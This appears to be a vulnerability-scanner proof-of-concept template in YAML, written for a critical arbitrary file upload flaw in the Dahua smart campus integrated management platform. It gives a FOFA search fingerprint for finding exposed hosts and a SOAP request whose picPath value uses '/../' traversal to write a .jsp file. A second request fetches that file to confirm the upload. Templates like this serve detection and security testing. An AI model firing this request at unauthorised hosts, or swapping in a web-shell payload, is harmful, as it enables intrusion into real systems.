id: poc-yaml-dahua-zhyq-integrated-management-platform-bitmap-anyfile-upload
info:
  name: 大华智慧园区综合管理平台 bitmap 任意文件上传漏洞
  severity: critical
  tags:
  - 两高一弱
  - 文件上传
  finger: 大华智慧园区综合管理平台
  fofa: body="WPMS/asset/common/js/jsencrypt.min.js"
variables:
  t1: base64(random_str(4))
  t2: base64(t1)
requests:
- method: POST
  path: /emap/webservice/gis/soap/bitmap
  headers:
    Content-Type: text/xml;charset=UTF-8
  data: "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\
    \ xmlns:res=\"http://response.webservice.bitmap.mapbiz.emap.dahuatech.com/\">\n\
    <soapenv:Header/>           \n  <soapenv:Body>\n           <res:uploadPicFile>\n\
    \              <arg0>\n               <picPath>/../{{.t1}}.jsp</picPath>\n   \
    \           </arg0>\n              <arg1>{{.t2}}</arg1>\n          </res:uploadPicFile>\n\
    \  </soapenv:Body>\n</soapenv:Envelope>"
  expression: status_code == 200 && contains(body,"<code>1</code>")
- method: GET
  path: /upload/{{.t1}}.jsp
  expression: status_code == 200 && body == t1
transport: http
